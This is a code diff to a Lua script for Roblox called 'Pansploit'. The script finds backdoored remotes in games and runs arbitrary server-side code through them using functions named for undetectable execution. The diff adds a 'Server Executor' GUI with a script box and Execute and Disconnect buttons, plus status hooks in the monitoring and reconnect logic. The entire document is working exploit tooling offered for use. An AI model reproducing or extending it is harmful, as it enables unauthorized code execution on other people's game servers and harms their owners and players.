@@ -10,6 +10,7 @@ _bs._m = {}
 _bs._s = tick()
 _bs._cb = nil
 _bs._currentGameId = nil
+_bs._gui = nil  -- [NEW] GUI reference
 
 if not _G._pans_backdoor_storage then
     _G._pans_backdoor_storage = {}
@@ -48,10 +49,292 @@ local _cat = {
 
 local function _log(m, t)
     t = t or "INFO"
-    if _cfg.debug or t == "ERROR" or t == "FOUND" or t == "DISCONNECT" or t == "LEAVE" or t == "REACTIVATE" then
+    if _cfg.debug or t == "ERROR" or t == "FOUND" or t == "DISCONNECT" or t == "LEAVE" or t == "REACTIVATE" or t == "GUI" then
         print(("[BD:%s] %s"):format(t, m))
     end
     if _bs._cb then _bs._cb(m, t) end
+end
+
+-- [NEW] Create GUI Executor
+local function _createGUI()
+    if _bs._gui then
+        pcall(function() _bs._gui:Destroy() end)
+    end
+    
+    local player = game:GetService("Players").LocalPlayer
+    if not player then return nil end
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "PanExecutor"
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    -- Parent to CoreGui or PlayerGui
+    pcall(function()
+        screenGui.Parent = game:GetService("CoreGui")
+    end)
+    
+    if not screenGui.Parent then
+        screenGui.Parent = player:WaitForChild("PlayerGui")
+    end
+    
+    _bs._gui = screenGui
+    
+    -- Main Frame
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainFrame"
+    mainFrame.Size = UDim2.new(0, 400, 0, 300)
+    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Active = true
+    mainFrame.Draggable = true  -- Built-in draggable
+    mainFrame.Parent = screenGui
+    
+    -- Corner radius
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = mainFrame
+    
+    -- Title Bar
+    local titleBar = Instance.new("Frame")
+    titleBar.Name = "TitleBar"
+    titleBar.Size = UDim2.new(1, 0, 0, 30)
+    titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    titleBar.BorderSizePixel = 0
+    titleBar.Parent = mainFrame
+    
+    local titleCorner = Instance.new("UICorner")
+    titleCorner.CornerRadius = UDim.new(0, 8)
+    titleCorner.Parent = titleBar
+    
+    -- Title Text
+    local titleText = Instance.new("TextLabel")
+    titleText.Name = "Title"
+    titleText.Size = UDim2.new(1, -100, 1, 0)
+    titleText.Position = UDim2.new(0, 10, 0, 0)
+    titleText.BackgroundTransparency = 1
+    titleText.Text = "[Pansploit] Server Executor"
+    titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleText.Font = Enum.Font.SourceSansBold
+    titleText.TextSize = 16
+    titleText.TextXAlignment = Enum.TextXAlignment.Left
+    titleText.Parent = titleBar
+    
+    -- Status Indicator (Green/Red dot)
+    local statusDot = Instance.new("Frame")
+    statusDot.Name = "StatusDot"
+    statusDot.Size = UDim2.new(0, 10, 0, 10)
+    statusDot.Position = UDim2.new(1, -85, 0.5, -5)
+    statusDot.BackgroundColor3 = Color3.fromRGB(0, 255, 0)  -- Green = active
+    statusDot.BorderSizePixel = 0
+    statusDot.Parent = titleBar
+    
+    local statusCorner = Instance.new("UICorner")
+    statusCorner.CornerRadius = UDim.new(1, 0)
+    statusCorner.Parent = statusDot
+    
+    -- Status Text
+    local statusText = Instance.new("TextLabel")
+    statusText.Name = "StatusText"
+    statusText.Size = UDim2.new(0, 60, 1, 0)
+    statusText.Position = UDim2.new(1, -75, 0, 0)
+    statusText.BackgroundTransparency = 1
+    statusText.Text = "Active"
+    statusText.TextColor3 = Color3.fromRGB(0, 255, 0)
+    statusText.Font = Enum.Font.SourceSans
+    statusText.TextSize = 14
+    statusText.Parent = titleBar
+    
+    -- Store references for updating
+    _bs._guiStatusDot = statusDot
+    _bs._guiStatusText = statusText
+    
+    -- Minimize Button (-)
+    local minButton = Instance.new("TextButton")
+    minButton.Name = "Minimize"
+    minButton.Size = UDim2.new(0, 25, 0, 25)
+    minButton.Position = UDim2.new(1, -55, 0, 2)
+    minButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    minButton.Text = "-"
+    minButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    minButton.Font = Enum.Font.SourceSansBold
+    minButton.TextSize = 18
+    minButton.Parent = titleBar
+    
+    local minCorner = Instance.new("UICorner")
+    minCorner.CornerRadius = UDim.new(0, 4)
+    minCorner.Parent = minButton
+    
+    -- Close/Disconnect Button (X)
+    local closeButton = Instance.new("TextButton")
+    closeButton.Name = "Close"
+    closeButton.Size = UDim2.new(0, 25, 0, 25)
+    closeButton.Position = UDim2.new(1, -28, 0, 2)
+    closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    closeButton.Text = "X"
+    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeButton.Font = Enum.Font.SourceSansBold
+    closeButton.TextSize = 14
+    closeButton.Parent = titleBar
+    
+    local closeCorner = Instance.new("UICorner")
+    closeCorner.CornerRadius = UDim.new(0, 4)
+    closeCorner.Parent = closeButton
+    
+    -- Script TextBox
+    local textBox = Instance.new("TextBox")
+    textBox.Name = "ScriptBox"
+    textBox.Size = UDim2.new(1, -20, 1, -80)
+    textBox.Position = UDim2.new(0, 10, 0, 40)
+    textBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    textBox.PlaceholderText = "-- Enter server-side script here..."
+    textBox.Text = ""
+    textBox.Font = Enum.Font.SourceSans
+    textBox.TextSize = 14
+    textBox.TextXAlignment = Enum.TextXAlignment.Left
+    textBox.TextYAlignment = Enum.TextYAlignment.Top
+    textBox.ClearTextOnFocus = false
+    textBox.MultiLine = true
+    textBox.TextWrapped = true
+    textBox.Parent = mainFrame
+    
+    local textCorner = Instance.new("UICorner")
+    textCorner.CornerRadius = UDim.new(0, 4)
+    textCorner.Parent = textBox
+    
+    -- Button Frame
+    local buttonFrame = Instance.new("Frame")
+    buttonFrame.Name = "ButtonFrame"
+    buttonFrame.Size = UDim2.new(1, -20, 0, 30)
+    buttonFrame.Position = UDim2.new(0, 10, 1, -35)
+    buttonFrame.BackgroundTransparency = 1
+    buttonFrame.Parent = mainFrame
+    
+    -- Execute Button
+    local execButton = Instance.new("TextButton")
+    execButton.Name = "Execute"
+    execButton.Size = UDim2.new(0.32, -5, 1, 0)
+    execButton.BackgroundColor3 = Color3.fromRGB(0, 120, 0)
+    execButton.Text = "Execute"
+    execButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    execButton.Font = Enum.Font.SourceSansBold
+    execButton.TextSize = 14
+    execButton.Parent = buttonFrame
+    
+    local execCorner = Instance.new("UICorner")
+    execCorner.CornerRadius = UDim.new(0, 4)
+    execCorner.Parent = execButton
+    
+    -- Clear Button
+    local clearButton = Instance.new("TextButton")
+    clearButton.Name = "Clear"
+    clearButton.Size = UDim2.new(0.32, -5, 1, 0)
+    clearButton.Position = UDim2.new(0.34, 0, 0, 0)
+    clearButton.BackgroundColor3 = Color3.fromRGB(100, 100, 0)
+    clearButton.Text = "Clear"
+    clearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    clearButton.Font = Enum.Font.SourceSansBold
+    clearButton.TextSize = 14
+    clearButton.Parent = buttonFrame
+    
+    local clearCorner = Instance.new("UICorner")
+    clearCorner.CornerRadius = UDim.new(0, 4)
+    clearCorner.Parent = clearButton
+    
+    -- Disconnect Button
+    local discButton = Instance.new("TextButton")
+    discButton.Name = "Disconnect"
+    discButton.Size = UDim2.new(0.32, -5, 1, 0)
+    discButton.Position = UDim2.new(0.68, 5, 0, 0)
+    discButton.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
+    discButton.Text = "Disconnect"
+    discButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    discButton.Font = Enum.Font.SourceSansBold
+    discButton.TextSize = 14
+    discButton.Parent = buttonFrame
+    
+    local discCorner = Instance.new("UICorner")
+    discCorner.CornerRadius = UDim.new(0, 4)
+    discCorner.Parent = discButton
+    
+    -- Button functionality
+    execButton.MouseButton1Click:Connect(function()
+        local script = textBox.Text
+        if script and #script > 0 then
+            _log("GUI Execute clicked", "GUI")
+            local success = _bs.Execute(script)
+            if success then
+                _log("GUI Execute success", "GUI")
+            else
+                _log("GUI Execute failed", "GUI")
+            end
+        else
+            _log("GUI: Empty script", "GUI")
+        end
+    end)
+    
+    clearButton.MouseButton1Click:Connect(function()
+        textBox.Text = ""
+        _log("GUI Clear clicked", "GUI")
+    end)
+    
+    discButton.MouseButton1Click:Connect(function()
+        _log("GUI Disconnect clicked", "GUI")
+        _updateGUIStatus(false)  -- Set to red/disconnected
+        _bs.Disconnect()
+    end)
+    
+    -- Minimize functionality
+    local minimized = false
+    minButton.MouseButton1Click:Connect(function()
+        minimized = not minimized
+        if minimized then
+            textBox.Visible = false
+            buttonFrame.Visible = false
+            mainFrame.Size = UDim2.new(0, 400, 0, 30)
+            minButton.Text = "+"
+        else
+            textBox.Visible = true
+            buttonFrame.Visible = true
+            mainFrame.Size = UDim2.new(0, 400, 0, 300)
+            minButton.Text = "-"
+        end
+    end)
+    
+    -- Close/Hide functionality
+    closeButton.MouseButton1Click:Connect(function()
+        _log("GUI Close clicked", "GUI")
+        screenGui.Enabled = false  -- Hide but don't destroy
+    end)
+    
+    _log("GUI Created successfully", "GUI")
+    return screenGui
+end
+
+-- [NEW] Update GUI status indicator
+local function _updateGUIStatus(isActive)
+    if _bs._guiStatusDot and _bs._guiStatusText then
+        if isActive then
+            _bs._guiStatusDot.BackgroundColor3 = Color3.fromRGB(0, 255, 0)  -- Green
+            _bs._guiStatusText.Text = "Active"
+            _bs._guiStatusText.TextColor3 = Color3.fromRGB(0, 255, 0)
+        else
+            _bs._guiStatusDot.BackgroundColor3 = Color3.fromRGB(255, 0, 0)  -- Red
+            _bs._guiStatusText.Text = "Disconnected"
+            _bs._guiStatusText.TextColor3 = Color3.fromRGB(255, 0, 0)
+        end
+    end
+end
+
+-- [NEW] Show GUI (if hidden)
+local function _showGUI()
+    if _bs._gui then
+        _bs._gui.Enabled = true
+    else
+        _createGUI()
+    end
 end
 
 local function _isSus(n)
@@ -273,7 +556,6 @@ local function _selectRandomBackdoor(backdoors)
     return selected, backup
 end
 
--- [MOVED UP] Undetectable execution - defined before Execute
 local function _undetectableExec(code)
     if not _bs._selected then
         _log("No backdoor selected", "ERROR")
@@ -323,7 +605,6 @@ local function _undetectableExec(code)
     end
 end
 
--- [MOVED UP] Find backdoor by stored path
 local function _findBackdoorByPath(path)
     if not path then return nil end
     
@@ -380,7 +661,6 @@ local function _findBackdoorByPath(path)
     return nil
 end
 
--- [MOVED UP] Quick scan for reactivation
 local function _quickScan()
     local quickServices = {
         game:GetService("ReplicatedStorage"),
@@ -426,7 +706,6 @@ local function _quickScan()
     return false
 end
 
--- [MOVED UP] Direct execution without active check
 local function _directExecute(code, backdoorInfo)
     if not backdoorInfo or not backdoorInfo.Object then
         return false
@@ -451,7 +730,6 @@ local function _directExecute(code, backdoorInfo)
     return pcall(tryExecute)
 end
 
--- Monitor functions
 local function _startMonitoring()
     if _bs._monitor then
         pcall(function() _bs._monitor:Disconnect() end)
@@ -486,6 +764,7 @@ local function _startMonitoring()
         
         if not exists then
             _log("BACKDOOR_REMOVED: " .. path, "DISCONNECT")
+            _updateGUIStatus(false)  -- [NEW] Update GUI to red
             _storage.selectedPath = nil
             _bs.Disconnect()
             return
@@ -493,6 +772,7 @@ local function _startMonitoring()
         
         if currentParent ~= parent then
             _log("BACKDOOR_MOVED: " .. path, "DISCONNECT")
+            _updateGUIStatus(false)
             _storage.selectedPath = nil
             _bs.Disconnect()
             return
@@ -500,6 +780,7 @@ local function _startMonitoring()
         
         if currentName ~= name then
             _log("BACKDOOR_RENAMED: " .. path, "DISCONNECT")
+            _updateGUIStatus(false)
             _storage.selectedPath = nil
             _bs.Disconnect()
             return
@@ -526,6 +807,7 @@ local function _startGameMonitoring()
         local currentGameId = tostring(game.GameId)
         if currentGameId ~= _bs._currentGameId then
             _log("GAME_CHANGED: " .. _bs._currentGameId .. " -> " .. currentGameId, "LEAVE")
+            _updateGUIStatus(false)
             _storage.selectedPath = nil
             print("PANS_PLAYER_LEFT:GameChanged")
             _bs.Disconnect()
@@ -536,6 +818,7 @@ local function _startGameMonitoring()
     pcall(function()
         game:BindToClose(function()
             _log("GAME_CLOSING", "LEAVE")
+            _updateGUIStatus(false)
             _storage.selectedPath = nil
             print("PANS_PLAYER_LEFT:GameClosed")
             _bs.Disconnect()
@@ -548,6 +831,7 @@ local function _startGameMonitoring()
     if localPlayer then
         localPlayer.Destroying:Connect(function()
             _log("PLAYER_DESTROYING", "LEAVE")
+            _updateGUIStatus(false)
             _storage.selectedPath = nil
             print("PANS_PLAYER_LEFT:PlayerDestroyed")
             _bs.Disconnect()
@@ -557,6 +841,7 @@ local function _startGameMonitoring()
         localPlayer:GetPropertyChangedSignal("Parent"):Connect(function()
             if localPlayer.Parent == nil and lastParent ~= nil then
                 _log("PLAYER_PARENT_NIL", "LEAVE")
+                _updateGUIStatus(false)
                 _storage.selectedPath = nil
                 print("PANS_PLAYER_LEFT:ParentNil")
                 _bs.Disconnect()
@@ -578,15 +863,12 @@ local function _stopMonitoring()
     _bs._currentGameId = nil
 end
 
--- NOW Define Execute (after all helper functions are defined)
 function _bs.Execute(code)
-    -- First check if we have an active backdoor
     if _bs._a and _bs._selected then
         _log("Executing through active backdoor...", "EXEC")
         return _undetectableExec(code)
     end
     
-    -- Try to reactivate from storage
     if _storage.selectedPath then
         _log("Attempting reactivation from storage: " .. _storage.selectedPath, "REACTIVATE")
         
@@ -596,6 +878,7 @@ function _bs.Execute(code)
             _bs._a = true
             
             _startMonitoring()
+            _updateGUIStatus(true)  -- [NEW] Update GUI to green
             
             _log("Reactivated successfully!", "REACTIVATE")
             return _undetectableExec(code)
@@ -605,7 +888,6 @@ function _bs.Execute(code)
         end
     end
     
-    -- Last resort: try quick scan
     if _cfg.autoReconnect then
         _log("Attempting quick scan for reactivation...", "REACTIVATE")
         
@@ -613,6 +895,7 @@ function _bs.Execute(code)
         if found and _bs._selected then
             _bs._a = true
             _startMonitoring()
+            _updateGUIStatus(true)
             _log("Quick reactivation successful!", "REACTIVATE")
             return _undetectableExec(code)
         end
@@ -622,7 +905,6 @@ function _bs.Execute(code)
     return false
 end
 
--- Main scan function
 function _bs.Scan()
     _log("Starting scan...", "SCAN")
     _bs._r = {}
@@ -727,7 +1009,7 @@ function _bs.Initialize(cb, cfg)
         _log("Found stored backdoor: " .. _storage.selectedPath, "INIT")
     end
     
-    _log("Initialized (Auto-Reconnect Enabled)", "INIT")
+    _log("Initialized (Auto-Reconnect + GUI Enabled)", "INIT")
     return _bs
 end
 
@@ -737,10 +1019,13 @@ function _bs.Activate()
         print(("PANS_BACKDOOR_ACTIVE:1:%s:%s"):format(_bs._selected.Path, _bs._selected.Type))
         print(("PANS_BACKDOOR_SELECTED:%s:%s:%s"):format(_bs._selected.Path, _bs._selected.Type, _bs._selected.ExecutionMethod or "direct"))
         
+        -- [NEW] Create GUI when activated
+        _createGUI()
+        
         _startMonitoring()
         _startGameMonitoring()
         
-        _log("Active and monitored", "ACTIVE")
+        _log("Active, monitored, and GUI created", "ACTIVE")
         return true
     end
     _log("No backdoor selected", "ERROR")
@@ -750,6 +1035,10 @@ end
 function _bs.Disconnect()
     _stopMonitoring()
     _bs._a = false
+    
+    -- [NEW] Update GUI status
+    _updateGUIStatus(false)
+    
     local oldPath = "unknown"
     if _bs._selected then
         oldPath = _bs._selected.Path
@@ -757,6 +1046,8 @@ function _bs.Disconnect()
     _bs._selected = nil
     print("PANS_BACKDOOR_DISCONNECTED:" .. oldPath)
     _log("Disconnected: " .. oldPath, "DISCONNECT")
+    
+    -- [NEW] Don't destroy GUI, just update status so user can see it's disconnected
 end
 
 function _bs.GetStatus()
@@ -768,7 +1059,8 @@ function _bs.GetStatus()
         BackupCount = #_bs._backup,
         NormalRemotes = #_bs._n,
         ScanTime = tick() - _bs._s,
-        CurrentGameId = _bs._currentGameId
+        CurrentGameId = _bs._currentGameId,
+        HasGUI = _bs._gui ~= nil
     }
 end
 
@@ -778,6 +1070,28 @@ end
 
 function _bs.GetBackups()
     return _bs._backup
+end
+
+-- [NEW] Toggle GUI visibility
+function _bs.ToggleGUI()
+    if _bs._gui then
+        _bs._gui.Enabled = not _bs._gui.Enabled
+        return _bs._gui.Enabled
+    else
+        _createGUI()
+        return true
+    end
+end
+
+-- [NEW] Destroy GUI completely
+function _bs.DestroyGUI()
+    if _bs._gui then
+        pcall(function() _bs._gui:Destroy() end)
+        _bs._gui = nil
+        _bs._guiStatusDot = nil
+        _bs._guiStatusText = nil
+        _log("GUI Destroyed", "GUI")
+    end
 end
 
 return _bs
